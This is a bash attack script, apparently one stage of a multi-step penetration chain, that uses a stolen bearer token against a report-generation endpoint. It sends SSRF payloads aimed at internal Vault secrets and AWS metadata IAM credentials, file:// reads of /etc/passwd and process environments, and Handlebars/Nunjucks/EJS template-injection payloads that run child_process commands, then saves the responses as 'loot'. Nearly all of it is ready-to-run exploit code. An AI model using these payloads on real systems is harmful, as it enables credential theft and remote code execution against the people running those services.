#!/usr/bin/env bash
# Stage 4 — SSRF vía template HTML renderizado server-side
# El endpoint /api/v2/reports/generate consume {"template":"<html>..."}
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWT=$(cat "${LOOT_DIR}/stage2_access_token.jwt")

OUT="${LOOT_DIR}/stage4_template.txt"
: > "${OUT}"

post_template() {
  local label="$1"
  local template="$2"
  local payload
  # Guardar el template en archivo temporal y serializar como JSON con jq -Rs
  echo "${template}" > /tmp/_tpl
  payload=$(jq -Rs --arg t "$(cat /tmp/_tpl)" '{template:$t}' < /tmp/_tpl)
  # Más simple: armar JSON con printf
  payload=$(jq -n --arg t "${template}" '{template:$t}')

  echo "###################### ${label} ######################" | tee -a "${OUT}"
  curl -s -X POST "${API_URL}/api/v2/reports/generate" \
    -H "Authorization: Bearer ${JWT}" \
    -H "Content-Type: application/json" \
    -d "${payload}" \
    -w '\n[%{http_code}] [type=%{content_type}] [size=%{size_download}]\n' \
    -o /tmp/_resp
  head -c 2000 /tmp/_resp | tee -a "${OUT}"
  echo | tee -a "${OUT}"
  echo "---" | tee -a "${OUT}"
  # Guardar copia binaria por si el response es PDF
  cp /tmp/_resp "${LOOT_DIR}/resp_$(echo "${label}" | tr ' /' '__').bin"
}

# 1) Template trivial — confirmar que se renderiza
post_template "trivial" "<html><body><h1>hello</h1></body></html>"

# 2) Iframe a Vault
post_template "iframe_vault_health" "<html><body><iframe src='http://internal-vault.nexacorp.local:8200/v1/sys/health' width='1200' height='800'></iframe></body></html>"

post_template "iframe_vault_root" "<html><body><iframe src='http://internal-vault.nexacorp.local:8200/' width='1200' height='800'></iframe></body></html>"

post_template "iframe_vault_secret" "<html><body><iframe src='http://internal-vault.nexacorp.local:8200/v1/secret/data/critical' width='1200' height='800'></iframe></body></html>"

# 3) Iframe a AWS metadata
post_template "iframe_aws_meta" "<html><body><iframe src='http://169.254.169.254/latest/meta-data/' width='1200' height='800'></iframe></body></html>"

post_template "iframe_aws_iam" "<html><body><iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role' width='1200' height='800'></iframe></body></html>"

# 4) JavaScript fetch + render — funciona con puppeteer si waitUntil=networkidle
post_template "js_fetch_aws" "<html><body><pre id='x'>loading</pre><script>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role').then(r=>r.text()).then(t=>{document.getElementById('x').textContent=t;});</script></body></html>"

post_template "js_fetch_vault" "<html><body><pre id='x'>loading</pre><script>fetch('http://internal-vault.nexacorp.local:8200/v1/secret/data/critical').then(r=>r.text()).then(t=>{document.getElementById('x').textContent=t;});</script></body></html>"

# 5) file:// — algunos PDF renderers permiten file local
post_template "file_passwd" "<html><body><iframe src='file:///etc/passwd' width='1200' height='800'></iframe></body></html>"

post_template "file_self_proc" "<html><body><iframe src='file:///proc/self/environ' width='1200' height='800'></iframe></body></html>"

# 6) <object> + <embed>
post_template "object_vault" "<html><body><object data='http://internal-vault.nexacorp.local:8200/v1/sys/health' type='text/plain'></object></body></html>"

# 7) Window.location redirect → exfil hacia un servidor externo (si hubiera)
# (omitido — sin attacker server)

# 8) SSTI por si el template se evalúa
post_template "ssti_handlebars" "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"

post_template "ssti_ejs" "<%= 7*7 %>"

post_template "ssti_jinja" "{{ 7*7 }} {{config}}"

post_template "ssti_simple_eval" "<%= require('child_process').execSync('id').toString() %>"

# 9) chrome-headless local-file leak via XHR (algunos puppeteer permiten file:// via XHR)
post_template "xhr_etc_passwd" "<html><body><pre id='x'></pre><script>var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();document.getElementById('x').textContent=x.responseText;</script></body></html>"

# 10) Server-side template engine sandboxed escape (Pug/Nunjucks)
post_template "ssti_pug" "h1= 7*7"
post_template "ssti_nunjucks" "{{ range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")() }}"

echo
echo "[+] Resultados completos en ${OUT}"
echo "[+] Responses guardadas en ${LOOT_DIR}/resp_*.bin"
echo
echo "[*] Si alguno devolvió un PDF (size > unos KB y content-type pdf), ábrelo:"
echo "    ls -la ${LOOT_DIR}/resp_*.bin"
echo "    file ${LOOT_DIR}/resp_*.bin"
ls -la "${LOOT_DIR}"/resp_*.bin 2>/dev/null || true
